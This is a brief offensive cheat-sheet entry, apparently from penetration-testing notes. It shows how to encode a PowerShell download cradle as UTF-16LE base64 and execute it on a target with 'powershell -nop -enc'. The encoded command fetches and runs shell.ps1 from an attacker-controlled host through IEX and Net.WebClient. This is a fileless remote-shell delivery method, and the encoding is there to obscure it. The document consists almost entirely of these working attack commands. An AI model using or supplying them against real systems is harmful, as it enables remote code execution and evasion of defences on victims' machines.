# encode powershell commands as base64 with windows wide char strings
```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://$ATTACKER/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```
## Target:
```
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
